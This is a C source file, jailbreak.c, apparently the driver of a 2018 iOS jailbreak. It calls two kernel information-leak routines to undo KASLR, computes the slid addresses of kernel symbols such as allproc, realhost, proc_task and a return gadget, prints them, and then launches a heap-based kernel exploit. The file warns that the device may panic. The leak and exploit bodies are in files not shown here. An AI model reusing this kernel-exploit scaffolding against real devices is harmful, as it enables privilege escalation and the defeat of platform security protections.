//
//  jailbreak.c
//  jailbreak112
//
//  Created by Sem Voigtländer on 11/04/2018.
//  Copyright © 2018 Jailed Inc. All rights reserved.
//

#include "jailbreak.h"
#include "infoleak.h"
#include "sploit.h"
#include "offsets.h"
uint64_t kaslr_shift = 0;
uint64_t kernel_text_base = 0;
uint64_t allproc = 0;
uint64_t realhost = 0;
uint64_t osdata_get_metaclass = 0;
uint64_t osserializer_serialize = 0;
uint64_t kernel_return = 0;
uint64_t kernel_uuid_copy = 0;
uint64_t proc_task = 0;
int jailbreak()
{
    //initialize kernel offsets needed for memory patches
    init_offsets();
    
    //leak aslr slide
    uint64_t kernelptr_bazad = bazadleak();
    uint64_t kernelptr_niklas = niklasleak(); //needs work
    
    if(kernelptr_bazad>0)
    {
        kernel_text_base = kernelptr_bazad - (0xfffffff01a29925c - 0xfffffff01a204000);
        kaslr_shift = kernel_text_base - default_offsets.off_kernel_base;
        osdata_get_metaclass = default_offsets.off_osdata_metaclass + kaslr_shift;
        kernel_return = osdata_get_metaclass + 8 + kaslr_shift;
        osserializer_serialize = default_offsets.off_osserializer_serialize + kaslr_shift;
        kernel_uuid_copy = default_offsets.off_kuuid_copy + kaslr_shift;
        allproc = default_offsets.off_allproc + kaslr_shift;
        realhost = default_offsets.off_realhost + kaslr_shift;
        proc_task = default_offsets.off_proc_task + kaslr_shift;
        printf("kernelinfo leak: %#llx\n", kernelptr_bazad);
        printf("kernelinfo leak: %#llx\n", kernelptr_niklas);
        printf("kaslr_shift: %#llx\n", kaslr_shift);
        printf("kernel base: %#llx\n", kernel_text_base);
        printf("allproc: %#llx\n", allproc);
        printf("realhost: %#llx\n", realhost);
        printf("osdata_get_metaclass: %#llx\n", osdata_get_metaclass);
        printf("ret: %#llx\n", kernel_return);
        printf("osserialize_serialize: %#llx\n", osserializer_serialize);
        printf("k_uuid_copy: %#llx\n", kernel_uuid_copy);
        printf("proc_task: %#llx\n\n", proc_task);
        
    } else {
        printf("Failed to leak a kernel pointer.\n");
    }
    printf("Running heap exploit, please wait...\n");
    kernelsploit();
    printf("Done, your device may panic in a few.\n");
    return kernelptr_bazad != 0;
}
